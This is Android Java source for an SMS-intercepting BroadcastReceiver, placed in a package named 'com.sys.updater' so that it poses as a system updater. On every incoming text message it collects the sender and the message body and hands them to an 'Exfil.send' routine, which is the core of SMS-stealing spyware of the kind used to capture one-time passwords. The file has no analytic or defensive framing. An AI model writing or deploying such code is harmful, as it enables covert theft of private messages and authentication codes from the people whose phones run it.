package com.sys.updater;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            if (pdus != null) {
                StringBuilder msgBody = new StringBuilder();
                String sender = "";
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    msgBody.append(sms.getMessageBody());
                    sender = sms.getOriginatingAddress();
                }
                Exfil.send("📩 SMS from " + sender + ":\n" + msgBody.toString());
            }
        }
    }
}
